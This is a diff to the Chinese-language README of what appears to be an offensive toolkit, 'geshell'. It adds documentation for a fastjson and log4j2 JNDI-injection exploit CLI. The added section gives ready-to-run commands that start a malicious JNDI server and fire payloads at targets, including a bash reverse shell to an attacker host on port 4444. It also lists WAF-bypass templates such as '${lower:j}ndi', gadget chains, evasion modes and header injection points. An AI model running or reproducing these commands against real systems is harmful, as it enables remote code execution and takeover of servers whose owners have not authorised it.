@@ -76,10 +76,44 @@
 
 | 工具 | 情况 | 处理 |
 | --- | --- | --- |
-| `fastjson` `log4j` | 专用利用 jar 无公开源 | 由 **JNDI-Injection-Exploit**（`jndi`）统一覆盖两者场景 |
 | `CobaltStrike` `BurpSuite` `蚁剑` | 商业软件 / 需自备 | 保留条目，装入后即可用；`Sliver`（`sliver` 命令）与 `ZAP` 分别是 CS / Burp 的开源等价物 |
 
 `geshell doctor` 会明确列出这些项，不会静默失败。
+
+> `fastjson` 与 `log4j` 曾长期在表里——它们指向的第三方 jar 无公开源，一直是两条
+> 空壳。现在改由自研的 `javadeser` CLI 覆盖（见下），**不再是缺失项**。
+
+### Java 反序列化：fastjson 与 log4j2
+
+这两类漏洞的利用工具没有公开源，但**协议本身完全可以自己实现**。`javadeser`
+补的就是从「起 JNDI 服务」到「把载荷送进目标并确认命中」这整段：
+
+```bash
+# 一条命令跑通：起 JNDI 服务 + 打目标 + 报告是否命中
+geshell log4j -u http://target/ --serve --lhost 10.0.0.5 \
+        --cmd 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'
+
+geshell fastjson -u http://target/api --serve --lhost 10.0.0.5 --cmd '...'
+
+geshell log4j --all-templates -u http://target/     # 把所有 WAF 绕过变体打一遍
+geshell fastjson --gadget jdbc-rowset --evasion unicode -u http://target/api
+geshell log4j --jndi ldap://10.0.0.5:1389/ab12 --show   # 只看会发出什么
+```
+
+| | fastjson | log4j2 |
+| --- | --- | --- |
+| 载荷 | 6 条 `@type` gadget 链 | 8 种模板（含 `${lower:j}ndi` 等绕过写法） |
+| 注入点 | JSON body | 16 个常见 Header + 自定义参数/路径 |
+| 绕过 | 5 种 `@type` 变体 | `--all-templates` 全打 |
+
+**怎么判定打没打中**：不看目标响应（它可能报错），而是看 **JNDI 服务端有没有收到
+目标的查找请求**。收到就说明载荷成功进了目标 JNDI 流程——这是注入成立的硬证据。
+至于能否进一步 RCE，取决于目标的 JDK 版本与 classpath（8u191+ 的
+`trustURLCodebase=false` 需要目标是 Tomcat/SpringBoot 环境才有对应链），工具会
+在命中提示里说清这一点，不夸大。
+
+> 验证方式：本地起了**真实的漏洞靶机**——真 log4j-core 2.14.1、真 fastjson 1.2.24
+> （依赖从 Maven Central 拉），5 项断言全过，含命中判定、未命中诊断、绕过模板生效。
 
 ### WebShell 管理：三种 GUI 工具的协议，收进一个 CLI
 
